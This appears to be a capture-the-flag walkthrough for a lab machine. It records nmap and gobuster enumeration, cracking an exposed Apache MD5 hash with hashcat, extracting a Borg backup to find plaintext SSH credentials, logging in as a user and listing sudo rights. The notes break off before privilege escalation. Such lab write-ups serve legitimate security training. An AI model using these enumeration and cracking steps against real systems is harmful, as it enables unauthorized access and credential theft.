@@ -1,1 +1,111 @@
+Nmap scan report for 10.10.211.139
+Host is up (0.039s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 db:b2:70:f3:07:ac:32:00:3f:81:b8:d0:3a:89:f3:65 (RSA)
+|   256 68:e6:85:2f:69:65:5b:e7:c6:31:2c:8e:41:67:d7:ba (ECDSA)
+|_  256 56:2c:79:92:ca:23:c3:91:49:35:fa:dd:69:7c:ca:ab (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Apache2 Ubuntu Default Page: It works
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+
+
+
+gobuster dir -u=http://10.10.203.106 -w=/home/kali/Desktop/wordlists/dirbuster/directory-list-2.3-medium.txt
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.203.106
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /home/kali/Desktop/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/admin                (Status: 301) [Size: 314] [--> http://10.10.203.106/admin/]
+/etc                  (Status: 301) [Size: 312] [--> http://10.10.203.106/etc/]
+
+
+
+
+
+We navigate to /etc
+
+find a directory named - squid/
+Inside are two files - passwd and squid.conf
+we grab both of them
+
+passwd - music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+
+squid.conf:
+auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
+auth_param basic children 5
+auth_param basic realm Squid Basic Authentication
+auth_param basic credentialsttl 2 hours
+acl auth_users proxy_auth REQUIRED
+http_access allow auth_users
+
+
+ran hashid against hash from passwd - $apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
+its apache md5
+
+hashcat -m 1600 -a 0 hash.txt /usr/share/wordlists/rockyou.txt     (had to switch to attack box as our kali linux machine doesnt have enough memory to run these attacks)
+
+$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward     - we get the password
+
+We download the archive file from the /admin/ directory - archive.tar
+
+tar -xvf archive.tar
+
+home/field/dev/final_archive/
+home/field/dev/final_archive/hints.5
+home/field/dev/final_archive/integrity.5
+home/field/dev/final_archive/config
+home/field/dev/final_archive/README
+home/field/dev/final_archive/nonce
+home/field/dev/final_archive/index.5
+home/field/dev/final_archive/data/
+home/field/dev/final_archive/data/0/
+home/field/dev/final_archive/data/0/5
+home/field/dev/final_archive/data/0/3
+home/field/dev/final_archive/data/0/4
+home/field/dev/final_archive/data/0/1
+
+
+After some research we find out that we have a Borg Repo here
+
+sudo apt install borgbackup
+
+borg extract ./home/field/dev/final_archive/::music_archive
+enter password
+
+From the extracted archive we find the note.txt file with the following:
+
+ow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!
+
+alex:S3cretP@s3
+
+With this we SSH into alex's account and get user flag
+
+sudo -l
+Matching Defaults entries for alex on ubuntu:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User alex may run the following commands on ubuntu:
+    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
+
+
+
+
 
